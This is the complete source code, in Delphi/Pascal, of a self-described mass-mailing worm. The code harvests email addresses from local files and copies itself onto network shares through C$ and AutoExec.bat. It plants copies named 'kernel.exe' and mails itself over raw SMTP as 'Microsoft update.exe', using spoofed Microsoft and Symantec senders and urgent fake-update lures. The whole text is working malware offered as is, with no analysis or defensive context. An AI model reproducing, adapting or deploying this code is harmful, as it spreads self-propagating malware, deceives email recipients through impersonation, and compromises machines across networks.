   program Massmailer;

   Uses
    Windows, Winsock;

   TYPE
    Triple = ARRAY[1..3] OF BYTE;
    Quad   = ARRAY[1..4] OF BYTE;

    TFileName = type string;
    TSearchRec = record
     Time: Integer;
     Size: Integer;
     Attr: Integer;
     Name: TFileName;
     ExcludeAttr: Integer;
     FindHandle: THandle  platform;
     FindData: TWin32FindData  platform;
    end;

    LongRec = packed record
     case Integer of
     0: (Lo, Hi: Word);
     1: (Words: array [0..1] of Word);
     2: (Bytes: array [0..3] of Byte);
    end;

   Const
    Mess : String = 'This is Massmailer worm';
    faReadOnly  = $00000001;
    faHidden    = $00000002;
    faSysFile   = $00000004;
    faVolumeID  = $00000008;
    faDirectory = $00000010;
    faArchive   = $00000020;
    faAnyFile   = $0000003F;

   VAR
    Domains      : String;

    Mails        : String;
    Buf          : Array[0..255] Of Char;
    FileBuf      : Array[0..1000000] Of Byte;
    CC           : String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

   Bodies : Array[0..1] of String = (
   'Open the attachment for an urgent Windows update',
   'Open the attachment for an urgent update');
   Ctyp : Array[0..1] of String = (
   'audio/x-wav',
   'audio/x-wav');
   Attachs : Array[0..1] of String = (
   'Microsoft update.exe',
   'Microsoft update.exe');
   Subj : Array[0..1] of String = (
   'URGENT PLEASE READ!',
   'Urgent Info');
   Fromz : Array[0..1] of String = (
   'Microsoft <support@microsoft.com>',
   'Administrator <support@microsoft.com>');

    Function LowerCase(const S: string): string;
    var
     Len: Integer;
    begin
     Len := Length(S);
     SetString(Result, PChar(S), Len);
     if Len > 0 then CharLowerBuff(Pointer(Result), Len);
    end;

    Function FileSize(FileName: String): Int64;
    Var
      H: THandle;
      FData: TWin32FindData;
    Begin
      Result:= -1;

      H:= FindFirstFile(PChar(FileName), FData);
      If H <> INVALID_HANDLE_VALUE Then
      Begin
        Windows.FindClose(H);
        Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
      End;
    End;

    Function ExtractFileName(Str:String):String;
    Begin
     While Pos('\', Str)>0 Do
      Str := Copy(Str, Pos('\',Str)+1, Length(Str));
     Result := Str;
    End;

    Function Grabmails(Filename:string):String;
    Var
     F:Textfile;
     L1,L2,Text:string;
     MAIL:String;
     H,E,i, A:Integer;
     ABC,ABC2:STRING;
    Label again;
    begin

     ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
     ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';

     if FileSize(FileName) > 5000 then exit;
     CopyFile(Pchar(Filename),pchar(Filename+'_'),false);

     AssignFile(F,Filename+'_');
     try
      Reset(F);
     except
      exit;
     end;
     Read(F,L1);
     ReadLN(F,L2);
     Text:=L1;
     While NOt EOF(F) DO BEGIN
      Read(F,L1);
      ReadLN(F,L2);
      Text:=Text+'|'+L1;
     END;
     Closefile(F);

     Deletefile(pchar(Filename+'_'));

     if copy(text,1,2)='MZ' then exit;

     text:='|'+text+'|';
     result:='';

     AGAIN:

     IF pos('@',Text)>0 then begin

      A:=Pos('@',Text)-1;
      if a =0 then a := 1;
      L1 := copy(text,a,1);
      L2 := copy(text,a+2,1);
      H := pos(L1,abc);
      E := pos(L2,abc2);

      if (H = 0) or (e=0) then begin
       text:=copy(text,a+1,length(text));
       goto again;
      end;

      While POS(Copy(TExt,a,1),ABC)>0 do begin
       A:=A-1;
      end;

      a := a +1;
      Mail := copy(Text,a,length(text)); //grab start of mail.
      Mail := COpy(Mail,1,pos('@',mail)+2);
      i:= pos(MAIL,text)+length(mail);

      While pos(copy(mail,length(mail),1),ABC2)>0 do begin
       Mail := mail+copy(text,i,1);
       i:=i+1;
      end;

      if POS(copy(mail,length(mail),1),ABC2)=0 then
       Mail:=copy(mail,1,length(mail)-1);

      Result := Result+#13#10+Mail;
      Text:=copy(text,pos(mail,text)+length(mail),length(text));

      goto AGAIN;
     end;

    end;

    Function ExtractFileExt(s:string):String;
    Begin
     While Pos('.', S)>0 Do
      S := Copy(S, pos('.', S)+1, Length(s));
     Result := S;
    End;

    function FileExists(const FileName: string): Boolean;
    var
      Handle: THandle;
      FindData: TWin32FindData;
    begin
      Handle := FindFirstFileA(PChar(FileName), FindData);
      result:= Handle <> INVALID_HANDLE_VALUE;
      if result then
      begin
        CloseHandle(Handle);
      end;
    end;

    function FindMatchingFile(var F: TSearchRec): Integer;
    var
     LocalFileTime: TFileTime;
    begin
     with F do
      begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
         begin
          Result := GetLastError;
          Exit;
         end;
        FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
        FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     end;
     Result := 0;
    end;
    procedure FindClose(var F: TSearchRec);
    begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE;
     end;
    end;

    function FindFirst(const Path: string; Attr: Integer;
                       var  F: TSearchRec): Integer;
    const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
    begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
     end else
      Result := GetLastError;
    end;

    function FindNext(var F: TSearchRec): Integer;
    begin
     if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F)
     else
      Result := GetLastError;
    end;
    procedure Enumeration(aResource:PNetResource);
    var
     aHandle: THandle;
     k, BufferSize: DWORD;
     Buffer: array[0..1023] of TNetResource;
     i: Integer;
     begin
      WNetOpenEnum(2,0,0,aResource,aHandle);
      k:=1024;
      BufferSize:=SizeOf(Buffer);
      while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do
      for i:=0 to k-1 do
      begin
       if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
        Domains := Domains + copy(LowerCase(Buffer[i].lpRemoteName),3,MAX_PATH) + #13#10;
       if Buffer[i].dwUsage>0 then
      Enumeration(@Buffer[i])
     end;
     WNetCloseEnum(aHandle);
    end;

    Procedure Network;
    Var
     Name : String;
     Auto : TextFile;
    Begin
     Enumeration(NIL);
     While Domains <> '' Do Begin
      Name := Copy(Domains, 1, Pos(#13#10, Domains)-1);
      Try
       CopyFile(pChar(ParamStr(0)), pChar(Name + '\C$\Setup.exe'), False);
       If FileExists(pChar(Name + '\C$\AutoExec.bat')) Then Begin
        AssignFile(Auto, Name + '\C$\AutoExec.bat');
        Append(Auto);
        WriteLn(Auto, 'Setup.exe');
        CloseFile(Auto);
       End;
      Except
       ;
      End;
      Domains := Copy(Domains, Pos(#13#10, Domains)+2, Length(Domains));
     End;
    End;


    FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
    VAR
      Q    : Quad;
      Strg : STRING;
    BEGIN
      IF Count<3 THEN BEGIN
        T[3]:=0;
        Q[4]:=64;
      END ELSE Q[4]:=(T[3] AND $3F);
      IF Count<2 THEN BEGIN
        T[2]:=0;
        Q[3]:=64;
      END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
      Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
      Q[1]:=((T[1] SHR 2) AND $3F);
      Strg:='';
      FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
      RESULT:=Strg;
    END;

    FUNCTION BASE64(DataLength:DWORD) : AnsiString;
    VAR
      B      : AnsiString;
      I      : DWORD;
      Remain      : DWORD;
      Trip      : Triple;
      Count      : WORD;
    BEGIN
      Count:=0;
      B:='';
      FOR I:=1 TO DataLength DIV 3 DO BEGIN
        INC(Count,4);
        Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
        Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
        Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
        B:=B+codeb64(3,Trip);
        IF Count=76 THEN BEGIN
          B:=B+#13#10;
          Count:=0;
        END;
      END;
      Remain:=DataLength-(DataLength DIV 3)*3;
      IF Remain>0 THEN BEGIN
        Trip[1]:=Ord(FileBuf[DataLength-1]);
        IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
        IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
      END;
      RESULT:=B;
    END;


    Procedure SendMail(Recip, FromM, Server: String);
    Var
     Sock             : TSocket;
     WsaDatas         : TWSADATA;
     SockAddrIn       : TSockAddrIn;
     F                : FILE;
     Body, Attach,
     Sub, CTyp        : String;
     Linfo            : Integer;

    Procedure Mys(STR:STRING);
    Begin
     Send(Sock,STR[1],Length(STR),0);
    End;

    Begin

    Randomize;
    Linfo := Random(2);
    Body := Bodies[Linfo];
    Attach := Attachs[Linfo];
    Sub := Subj[Linfo];
    CTyp := Ctyp[Linfo];
    FromM := Fromz[Linfo];

    WSAStartUp(257,WsaDatas);
    Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    SockAddrIn.sin_family:=AF_INET;
    SockAddrIn.sin_port:=htons(25);
    SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(Server));
    If Connect(Sock,SockAddrIn,SizeOf(SockAddrIn)) <> SOCKET_ERROR Then Begin
     Mys('HELO .com'+#13#10);
     If Pos('<', Fromm)>0 Then
      Mys('Mail From: '+Copy(FromM, Pos('<', FromM)+1, Pos('>', FromM)-2)+#13#10) Else
      Mys('MAIL FROM: '+FromM+#13#10);
     Mys('RCPT TO: '+recip+#13#10);
     Mys('DATA'+#13#10);

     Mys('From: '+FromM+#13#10);
     Mys('Subject: '+Sub+#13#10);
     Mys('To: '+Recip+#13#10);

     Mys('MIME-Version: 1.0'+#13#10);
     Mys('Content-Type: multipart/mixed; boundary="ShutFace"'+#13#10+#13#10);
     Mys('--ShutFace'+#13#10);
     Mys('Content-Type: text/plain; charset:us-ascii'+#13#10+#13#10);

     Mys(Body+#13#10);

     Mys(#13#10+#13#10);
     Mys('--ShutFace'+#13#10);
     Mys('Content-Type: '+CTyp+';'+#13#10);
     Mys('    name="'+Attach+'"'+#13#10);
     Mys('Content-Transfer-Encoding: base64'+#13#10+#13#10);
     AssignFile(F,ParamStr(0));
     FileMode:=0;
     {$I-}
     Reset(F,1);
     IF IOResult=0 THEN BEGIN
      BlockRead(F,FileBuf[1],FileSize(ParamStr(0)));
      Mys(BASE64(FileSize(ParamStr(0))));
      CloseFile(F);
     END;
     {$I+}
     Mys(#13#10+'--ShutFace--'+#13#10+#13#10);
     Mys(#13#10+'.'+#13#10);
     Mys('QUIT'+#13#10);
    End;
    End;

    Procedure FFind(D, Name, SearchName : String);
      var
      SR: TSearchRec;
      ext: string;
      fil: textfile;
      l1: string;
      l2: string;
      lin: string;
    begin
      If D[Length(D)] <> '\' then D := D + '\';

      If FindFirst(D + '*.*', faDirectory, SR) = 0 then
        Repeat
          If ((SR.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
            FFind(D + SR.Name + '\', Name, SearchName)
          Else Begin
            ext := ExtractFileExt(SR.Name);

   If (ext = 'vbs') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'txt') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'htm') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'html') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'wab') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'js') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
   If (ext = 'asp') and   (FileSize(SR.Name) <= 800000) Then   Mails := Mails + GrabMails(D + SR.Name);
    If Pos('C:\',        ExtractFileName(Copy(D, 1, Length(D)-1)))>0 Then        CopyFile(pChar(ParamStr(0)), pChar(D+'suck it.exe'), False);
    If Pos('C:\Windows',        ExtractFileName(Copy(D, 1, Length(D)-1)))>0 Then        CopyFile(pChar(ParamStr(0)), pChar(D+'kernel.exe'), False);
           End;
        Until (FindNext(SR) <> 0);
      FindClose(SR);
    end;

    Begin
     Network;
     FFind('C:\', '*', '*.*');
     While Mails <> '' Do Begin
      SendMail(Copy(Mails, 1, Pos(#13#10, Mails)-1), 'support@symantec.com', 'mx1.hotmail.com');
      Mails := Copy(Mails, Pos(#13#10, Mails)+ 2, length(Mails));
     End;
    End.
